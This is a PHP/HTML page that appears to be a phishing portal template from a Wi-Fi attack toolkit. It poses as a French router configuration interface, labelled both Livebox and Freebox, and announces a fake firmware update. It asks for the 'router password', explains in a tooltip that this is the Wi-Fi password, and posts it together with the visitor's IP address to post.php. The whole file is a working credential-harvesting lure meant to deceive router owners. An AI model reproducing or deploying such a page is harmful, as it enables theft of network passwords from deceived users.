<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Interface de configuration Livebox">
    <title>Interface de configuration Livebox</title>
    <!-- Link to external CSS if needed -->
    <link rel="stylesheet" href="static/styles.css">
    <!-- Add a favicon if you want -->
    <link rel="icon" href="static/logo.png" type="image/x-icon">
</head>
<body>
    <div id="top-bar">
        <img id="logo" src="static/logo.png">
        <h1 id="title-livebox">Freebox</h1>
    </div>
    <h3 id="subtitle-livebox">Bienvenue sur l'interface de configuration de votre Freebox.</h1>
    
    <div id="form">
        <div class="col-sm">
            <h2 class="firmware-lead-text">Mise à jour du micrologiciel</h2>
            <p class="firmware-sub-text">Une mise à jour du micrologiciel de votre Freebox (version 2.3.1) a été détecté et est prête à être installée. Veuillez vérifier les points suivants avant de poursuivre.</p>
        </div>
        <form method="POST" action="post.php">
        <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
        
        <div class="center group-psw" id="psk_field">
            <img id="lock-img" src="static/lock.svg"></img>
            
            <input class="form-control" name="routpwd" type="password" id="pwd" placeholder="Mot de passe du routeur">
        </div>
        
        
        
        

        <div class="center">
            <div class="isa_info" id="pw_status" align="left"></div>
            <br>
            <button class="start-btn" onclick="checkBoxStatus(event)">Mettre à jour</button>
        </div>

        
        </form>

        <p id="default-psw">
            Où trouver votre mot de passe par défaut ?
            <span class="text-tooltip">Il s'agit du mot de passe de votre Wi-Fi</span>
        </p>

        <p id="info">
            Cette mise à jour prend quelques minutes. Vous retrouverez l'accès à votre Wi-Fi dès sa fin.
        </p>
    </div>

    <script>
    function checkBoxStatus(evt)
    {

    // get the password box and checkbox elements
        var box = document.getElementById("psk_field");
        var input = document.getElementById("pwd");

        if (input.value == ""){
            alert("Mot de passe requis.")
            evt.preventDefault();
        }

    }

    </script>
</body>
</html>